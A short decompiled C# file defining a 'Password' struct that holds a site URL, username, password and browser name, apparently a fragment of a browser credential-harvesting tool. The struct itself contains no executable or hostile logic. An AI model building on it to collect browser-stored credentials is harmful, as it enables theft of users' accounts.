﻿using System;

namespace SHARP
{
	// Token: 0x0200000A RID: 10
	public struct Password
	{
		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000035 RID: 53 RVA: 0x00002DD6 File Offset: 0x00000FD6
		// (set) Token: 0x06000036 RID: 54 RVA: 0x00002DDE File Offset: 0x00000FDE
		public string sUrl { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000037 RID: 55 RVA: 0x00002DE7 File Offset: 0x00000FE7
		// (set) Token: 0x06000038 RID: 56 RVA: 0x00002DEF File Offset: 0x00000FEF
		public string sUsername { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000039 RID: 57 RVA: 0x00002DF8 File Offset: 0x00000FF8
		// (set) Token: 0x0600003A RID: 58 RVA: 0x00002E00 File Offset: 0x00001000
		public string sPassword { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600003B RID: 59 RVA: 0x00002E09 File Offset: 0x00001009
		// (set) Token: 0x0600003C RID: 60 RVA: 0x00002E11 File Offset: 0x00001011
		public string sBrowser { get; set; }
	}
}
